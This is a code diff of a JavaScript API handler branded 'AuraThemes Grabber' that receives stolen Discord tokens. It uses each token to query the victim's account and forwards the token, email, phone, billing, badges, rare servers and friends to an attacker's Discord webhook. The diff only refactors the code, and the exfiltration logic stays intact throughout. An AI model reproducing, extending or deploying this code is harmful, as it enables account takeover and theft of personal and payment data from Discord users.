@@ -1,6 +1,6 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
-import getDiscordInfo from '../../../utils/functions.cjs';
-import k4itrunConfig from '../../../../k4itrun.config';
+import DiscordToken from '../../../utils/functions.cjs';
+import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
   url: k4itrunConfig.webhook,
@@ -8,78 +8,94 @@ const webhook = new WebhookClient({
 
 const EMBED_COLORS = {
   raw: '#c267ff',
-  grab: '#c267ff',
+  initialized: '#c267ff',
 };
-
-const getField = (name = '-', value = '-', inline = false) => ({ name, value, inline });
-
-const embedGrabber = (guilds, friends, infos, token, embed) => new EmbedBuilder()
-  .setAuthor({ name: `${infos.username} | ${infos.ID}`, iconURL: infos.avatar })
-  .setThumbnail(infos.avatar)
-  .setColor(EMBED_COLORS.grab)
-  .setTitle('AuraThemes Dualhooked - 6889.fun')
-  .addFields(
-    getField('<a:aura:1087044506542674091> Token:', `\`\`\`${token}\`\`\``, false),
-    getField('<a:aura:1101739920319590420> Nitro:', infos.nitroType, true),
-    getField('<a:aura:863691953531125820> Phone', `\`${infos.phone}\``, true),
-    getField('<:aura:974711605927505990> Email', `\`${infos.mail}\``, false),
-    getField('Badges', infos.badges, true),
-    getField('Billing', infos.billing, true),
-    getField('Langue', infos.langue, true),
-  )
-  .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
-  .setTimestamp();
-
-const embedRaw = (token, embed) => new EmbedBuilder()
-  .setAuthor({ name: 'AuraThemes' })
-  .setColor(EMBED_COLORS.raw)
-  .setTitle('raw')
-  .addFields(getField('New visit lmao', `\`\`\`${token}\`\`\``))
-  .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
-  .setTimestamp();
-
-const getEmbed = async () => ({
-  avatar: 'https://i.imgur.com/WkKXZSl.gif',
-  url: 'https://discord.gg/aurathemes',
-  footericon: 'https://i.imgur.com/WkKXZSl.gif',
-});
 
 export default async function handler(req, res) {
   try {
     const { query } = req;
     if (!query.data) {
-      res.status(400).send('Bad Request: Missing "data" query parameter.');
+      res.status(400).send('Bad Request: Missing "data" query parameter');
       return;
     }
 
     const { data } = query;
-    const token = data;
     const embed = await getEmbed();
     const response = await fetch('https://discord.com/api/v9/users/@me', {
       headers: {
-        authorization: token,
+        authorization: data,
       },
     });
 
     const info = await response.json();
+
     console.log(info);
 
-    const infos = getDiscordInfo(token).all;
-    const guilds = getDiscordInfo(token).guilds.rares;
-    const friends = getDiscordInfo(token).friends.rares;
-    const embedBuilder = (infos?.ID || infos.ID)
-      ? embedGrabber(infos, token, embed)
-      : embedRaw(token, embed);
+    const Discord = DiscordToken(data).all;
+    const guilds = DiscordToken(data).guilds.rares;
+    const friends = DiscordToken(data).friends.rares;
+    const embedBuilder = (Discord?.ID || Discord.ID) 
+      ? buildInitializedEmbed(guilds, friends, Discord, data, embed)
+      : buildRawEmbed(data, embed);
 
     await webhook.send({
       embeds: [embedBuilder],
       username: '@AuraThemes',
       avatarURL: embed.avatar,
     });
-
     res.status(200).send(data);
-  } catch (e) {
-    console.error('Error:', e);
+  } catch (error) {
+    console.error('Error:', error);
     res.status(500).send('Internal Server Error');
   }
+}
+
+function getField(a = null, b = null, c = false) {
+  let name = a;
+  let value = b;
+  let inline = c;
+  if (!name || name.length < 1) name = '-';
+  if (!value || value.length < 1) value = '-';
+  return { name, value, inline };
+}
+
+function buildRawEmbed(data, embed) {
+  const rawEmbed = new EmbedBuilder()
+    .setAuthor({ name: 'AuraThemes' })
+    .setColor(EMBED_COLORS.raw)
+    .setTitle('raw')
+    .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
+    .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
+    .setTimestamp();
+  return rawEmbed;
+}
+
+function buildInitializedEmbed(guilds, friends, Discord, data, embed) {
+  const initializedEmbed = new EmbedBuilder()
+    .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
+    .setThumbnail(Discord.avatar)
+    .setColor(EMBED_COLORS.initialized)
+    .setTitle('AuraThemes Dualhooked - 6889.fun')
+    .addFields(
+      getField('<a:aura:1087044506542674091> Token:', `\`\`\`${data}\`\`\``, false),
+      getField('<a:aura:1101739920319590420> Nitro:', Discord.nitroType, true),
+      getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
+      getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
+      getField('Badges', Discord.badges, true),
+      getField('Billing', Discord.billing, true),
+      getField('\u200b', '**Rare Servers**\n' + guilds, true),
+      getField('\u200b', "\u200b", false),
+      getField('\u200b', '**Rare Friends**\n' + friends, true)
+    )
+    .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
+    .setTimestamp();
+  return initializedEmbed;
+}
+
+async function getEmbed() {
+  return {
+    avatar: 'https://i.imgur.com/WkKXZSl.gif',
+    url:  'https://discord.gg/aurathemes',
+    footericon: 'https://i.imgur.com/WkKXZSl.gif',
+  };
 }
